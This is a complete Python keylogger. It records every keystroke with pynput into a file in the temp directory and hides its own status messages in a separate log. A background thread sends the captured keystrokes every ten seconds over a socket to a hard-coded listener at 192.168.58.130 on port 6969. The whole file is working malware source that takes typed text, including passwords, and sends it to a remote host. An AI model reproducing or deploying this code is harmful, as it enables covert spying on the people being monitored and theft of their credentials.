import socket
import threading
import time
import os
from pynput import keyboard
import tempfile

# Get the location of the temp directory
temp_dir = tempfile.gettempdir()

# Define IP and Port of the listener
SERVER_IP = '192.168.58.130'
SERVER_PORT = 6969  # Use the appropriate port number

# File paths in the temp directory
keyfile_path = os.path.join(temp_dir, "Keyfile.txt")
logfile_path = os.path.join(temp_dir, "log.txt")

# Function to ensure the log file is created if it doesn't exist
def ensure_log_file_exists():
    if not os.path.exists(keyfile_path):
        with open(keyfile_path, 'w') as file:
            file.write("")  # Create an empty file if it doesn't exist

# Function to log output to log.txt in the temp folder instead of printing to console
def log_output(message):
    with open(logfile_path, 'a') as log_file:
        log_file.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {message}\n")

# Function to send the log file to the server every 10 seconds
def send_log_file():
    while True:
        try:
            # Open the log file
            with open(keyfile_path, "r") as file:
                log_data = file.read()

            # Establish a connection to the server
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((SERVER_IP, SERVER_PORT))
                s.sendall(log_data.encode('utf-8'))  # Send the log file data

            log_output("Log file sent successfully.")
        
        except Exception as e:
            log_output(f"Failed to send file: {e}")
        
        time.sleep(10)  # Wait for 10 seconds before sending the file again

# Function to capture and log key presses
def keypress(key):
    ensure_log_file_exists()  # Ensure the log file exists before writing to it
    with open(keyfile_path, 'a') as logkey:
        try:
            # Log the character of the key pressed, which handles uppercase by default
            char = key.char
            if char.isalpha():  # If it's an alphabet, check if it's upper or lower case
                logkey.write(char)
            else:
                logkey.write(char)
        except AttributeError:
            # Handle the spacebar separately to log a space
            if key == keyboard.Key.space:
                logkey.write(' ')
            # Handle the Backspace key logging as "<Key.f1: 0>"
            elif key == keyboard.Key.backspace:
                logkey.write('<Key.f1: 0>')
            else:
                log_output(f"Special key pressed: {key}")
        except Exception as e:
            log_output(f"Failed to write key: {e}")

# Main function
if __name__ == '__main__':
    # Ensure the log file is created if it doesn't exist
    ensure_log_file_exists()

    # Log the start of the keylogger
    log_output("Keylogger started.")

    # Start the keylogger
    listener = keyboard.Listener(on_press=keypress)
    listener.start()

    # Start the thread to send the log file periodically
    file_sender_thread = threading.Thread(target=send_log_file)
    file_sender_thread.daemon = True  # Allows the thread to exit when the main program does
    file_sender_thread.start()

    # Keep the keylogger running
    listener.join()